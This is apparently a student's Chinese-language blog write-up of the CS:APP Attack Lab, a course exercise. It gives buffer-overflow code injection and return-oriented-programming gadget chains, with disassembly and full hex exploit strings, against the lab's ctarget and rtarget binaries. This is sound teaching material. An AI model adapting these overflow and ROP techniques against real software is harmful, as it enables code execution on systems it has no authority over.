---
layout: post
title:  "CS:APP Attack Lab"
categories: Labs
tags: [reverse engineering, disassembling, code injection]
toc: true
--- 
There is some of the same fitness in a man's building his own house that there is in a bird's building its own nest. 
{: .message }

利用缓冲区溢出，完成代码注入与面向返回指令的攻击，深化理解栈机制。

使用 ctarget/rtarget 时，添加 -q 指令避免向服务器请求打分，添加 -i 指令读取文件为输入。

总体上有五个实验阶段，实验代码[见此](https://github.com/QifanWang/learning-csapp/tree/master/handout/target1)。

## Level 1

目标是通过缓冲区溢出，使test函数调用getbuf函数后，返回到touch1函数开始处。
{% highlight cpp %}
void test()
{
 int val;
 val = getbuf();
 printf("No exploit. Getbuf returned 0x%x\n", val);
}
{% endhighlight %}

经过 `objdump -d ctarget` 后节选test汇编代码，
{% highlight nasm %}
0000000000401968 <test>:
  401968:	48 83 ec 08          	sub    $0x8,%rsp
  40196c:	b8 00 00 00 00       	mov    $0x0,%eax
  401971:	e8 32 fe ff ff       	callq  4017a8 <getbuf>
  401976:	89 c2                	mov    %eax,%edx
{% endhighlight %}

需要将 401976 地址替换成 touch1 开始地址 4017c0 ，而在函数 getbuf 中栈空间为缓冲区预留了 0x28(40) 个字节，
{% highlight nasm %}
00000000004017a8 <getbuf>:
  4017a8:	48 83 ec 28          	sub    $0x28,%rsp
  4017ac:	48 89 e7             	mov    %rsp,%rdi
  4017af:	e8 8c 02 00 00       	callq  401a40 <Gets>
  4017b4:	b8 01 00 00 00       	mov    $0x1,%eax
  4017b9:	48 83 c4 28          	add    $0x28,%rsp
  4017bd:	c3                   	retq 
  4017be:	90                   	nop
  4017bf:	90                   	nop
{% endhighlight %}

所以只需要溢出 40 个字节替换返回地址即可，勿忘输入字符串会额外添加 terminator 且小端编码，
> X X .. X c0 17 40

## Level 2

目标是通过缓冲区溢出，使test函数调用getbuf函数后，返回到touch2函数开始处，并以指定整数值作为参数，为此需要注入代码。

注入指令代码，
{% highlight nasm %}
 # Level 2 injection code
	movq $0x59b997fa, %rdi	# use cookie value as 1st parameter of touch2
	push $0x4017ec		# push touch2 address
	retq			# return to touch2
{% endhighlight %}

注意，指令中用的是立即数，小心编写指令。

溢出两个地址，会产生段错误，可能是因为原先栈位置的值被使用了。

题目要求使用 ret 转移控制，可以通过指令压入 touch2 开始地址。

注入代码在栈上，通过 GDB 调试命令
`
print /x $rsp
`
可以得到buf开始地址为 0x5561dc78 ，大小为 40 个字节。注入代码就放在 buf 中，需要注意栈是向下(向地址0)处增长的，所以代码直接正放即可，

这里需要将指令转为十六进制，再转为 ASCII，可以用 gcc 与 objdump 转换十六进制，用 Lab 提供的工具 hex2raw 转ASCII码。

十六进制表示为，
{% highlight nasm %}
48 c7 c7 fa 97 b9 59 /* mov    $0x59b997fa,%rdi */
68 ec 17 40 00 /* pushq  $0x4017ec */
c3 /* retq */
30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 /* 27 bytes */
78 dc 61 55 00 00 00 00 /* buf start address 0x5561dc78 */
{% endhighlight %}

## Level 3

目标是通过缓冲区溢出，使test函数调用getbuf函数后，返回到touch3函数开始处，并以指定字符串作为参数，为此需要注入代码。

需要注意的是，由于 touch3 函数会调用 hexmatch 与 strncmp 函数，栈空间会变化与重写，字符串数据不能简单地放在 buf 中。

字符串数据放在缓冲区溢出的地址 0x5561dca8 处，注入指令代码，
{% highlight nasm %}
 # Level 3 injection code
	movq $0x5561dca8, %rdi	# string start address
	push $0x4018fa		# push touch3 address
	retq			# return touch3
{% endhighlight %}

注入代码与数据的对应十六进制表示为，
{% highlight nasm %}
48 c7 c7 a8 dc 61 55 /* mov    $0x5561dca8,%rdi */
68 fa 18 40 00 /* pushq  $0x4018fa */
c3 /* retq */
30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 /* 27 bytes */
78 dc 61 55 00 00 00 00 /* buf start address 0x5561dc78 */
35 39 62 39 39 37 66 61 /* cookie 59b997fa ASCII value */
{% endhighlight %}

## Level 4

第二部分的 rtarget 开始(1)使用栈随机化，使得注入代码难以定位，(2)限制栈区域内存为 nonexecutable (不可执行)，即使通过溢出地址定位到注入代码，程序也不会执行(发生段错误)。

因此，不是注入代码进行攻击，而是利用现有代码。例如，
{% highlight nasm %}
0000000000400f15 <setval_210>:
	400f15: c7 07 d4 48 89 c7 movl $0xc78948d4,(%rdi)
	400f1b: c3 retq
{% endhighlight %}

通过溢出地址，可以将 PC(Program Counter) 定位到 0x400f18 处，序列 48 89 c7 是指令 movq %rax, %rdi 的编码。由此，我们可以改变程序行为。

我们可以说 movl $0xc78948d4,(%rdi) 这个指令是，
> this code contains a gadget

本阶段的目标同 Level 2 一样，只是需要通过抽取 gadget 完成参数赋值。根据 Lab 限定的范围与提示，我们需要完成以下两个指令(可插入 nop)，
{% highlight nasm %}
popq %rax
movq %rax, %rdi
{% endhighlight %}

相应的函数为，

function | start address | gadget address | instruction
--- | --- | --- | ---
addval_219 | 0x4019a7 | 0x4019ab | popq %rax
setval_426 | 0x4019c3 | 0x4019c5 | movq %rax, %rdi

为此构造的 exploit string 的十六进制表示为，
{% highlight nasm %}
30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 /* 40 bytes */
ab 19 40 00 00 00 00 00 /* popq %rax instruction address */
fa 97 b9 59 00 00 00 00 /* para value to %rax : 0x59b997fa */
c5 19 40 00 00 00 00 00 /* movq %rax, %rdi instruction address 0x4019c5 */
ec 17 40 00 00 00 00 00 /* touch2 start address */
{% endhighlight %}

## Level 5

本阶段的目标同 Level 3 一样，只是需要通过抽取 gadget 完成参数赋值。而且由于栈随机化，不能直接传栈地址作为字符串开始地址。

先看下我们能够使用的 gadget 都是什么指令，

function | start address | gadget address | instruction
--- | --- | --- | ---
addval_273 | 0x4019a0 | 0x4019a2 | movq %rax, %rdi
addval_219 | 0x4019a7 | 0x4019ab | popq %rax
setval_426 | 0x4019c3 | 0x4019c5 | movq %rax, %rdi
getval_280 | 0x4019ca | 0x4019cc | popq %rax
add_xy | 0x4019d6 | 0x4019d6 | lea (%rdi,%rsi,1),%rax
getval_481 | 0x4019db | 0x4019dd | movl %eax, %edx
addval_190 | 0x401a03 | 0x401a06 | movq %rsp, %rax
addval_436 | 0x401a11 | 0x401a13 | movl %ecx, %esi
addval_187 | 0x401a25 | 0x401a27 | movl %ecx, %esi
getval_159 | 0x401a33 | 0x401a34 | movl %edx, %ecx
addval_487 | 0x401a40 | 0x401a42 | movl %eax, %edx
getval_311 | 0x401a68 | 0x401a69 | movl %edx, %ecx
addval_358 | 0x401a83 | 0x401a86 | movl %esp, %eax
setval_350 | 0x401aab | 0x401aad | movq %rsp, %rax

由于栈随机化，指令`movq %rax, %rdi` 与 `movq %rsp, %rax` 是必要的，因为只有这两个指令完成参数(第一个参数)赋值与得到栈地址。但只用这两个指令肯定不行，因为每执行一次 gadget 都会有 retq 导致栈空间变化。于是我们需要构造一个“距离”，这个可以借助指令`popq %rax`完成，再通过传递并调用指令`lea (%rdi,%rsi,1),%rax`得到字符串开始地址。

使用 gadget 如下(ignoring nop and functional op)，
{% highlight nasm %}
popq %rax ; the value to rsi store in rax
movl %eax, %edx
movl %edx, %ecx
movl %ecx, %esi ; rsi gets the distance value
movq %rsp, %rax ; the address that rdi will get
movq %rax, %rdi
lea (%rdi, %rsi, 1), %rax
movq %rax, %rdi ; rdi gets char array start address
{% endhighlight %}


构造的 exploit string 的十六进制表示，
{% highlight nasm %}
30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 /* 40 bytes */
ab 19 40 00 00 00 00 00 /* popq %rax instruction address */
20 00 00 00 00 00 00 00 /* distance value to %rax : 0x20(32), final to rsi */
dd 19 40 00 00 00 00 00 /* movl %eax, %edx instruction address 0x4019dd */
34 1a 40 00 00 00 00 00 /* movl %edx, %ecx instruction address 0x401a34 */
13 1a 40 00 00 00 00 00 /* movl %ecx, %esi instruction address 0x401a13 */
06 1a 40 00 00 00 00 00 /* movq %rsp, %rax instruction address 0x401a06 */
c5 19 40 00 00 00 00 00 /* movq %rax, %rdi instruction address 0x4019c5 */
d6 19 40 00 00 00 00 00 /* lea (%rdi, %rsi, 1), %rax instruction address 0x4019d6 */
c5 19 40 00 00 00 00 00 /* movq %rax, %rdi instruction address 0x4019c5 */
fa 18 40 00 00 00 00 00 /* touch3 start address 0x4018fa */
35 39 62 39 39 37 66 61 00 /* cookie 59b997fa ASCII value */
{% endhighlight %}

网络上有拆出 add 指令构造距离的做法，但我在这里还是按照实验文件列出的指令进行实验，寻找 gadget 略耗费时间但最终还是PASS了。

## Conclusions

通过 Level1~3 的实验我们可以看到，(1)通过缓冲区溢出返回地址，可以使程序跳转到指定地址，(2)在不限制内存的可执行代码区域时，用户可以向缓冲区内注入代码。

如果 ctarget 是一个网络服务器，我们将可以向远程机器注入代码，改变服务器的行为。

通过 Level 4 我们可以看到，如何绕过两种防止缓冲区溢出攻击的机制，即通过已有代码的片段(gadget)改变程序行为。

通过 Level 5 我们可以看到挖掘与组合各种 gadget 可以改变多种多样的程序行为。

## Reference
1. [CS:APP Lab Assignments](http://csapp.cs.cmu.edu/3e/labs.html)
2. [attack lab readme](http://csapp.cs.cmu.edu/3e/README-attacklab)
3. [attack lab writeup](http://csapp.cs.cmu.edu/3e/attacklab.pdf)
4. [Beej's Quick Guide to GDB](http://beej.us/guide/bggdb/)
5. [My Solution](https://github.com/QifanWang/learning-csapp/tree/master/handout/target1)
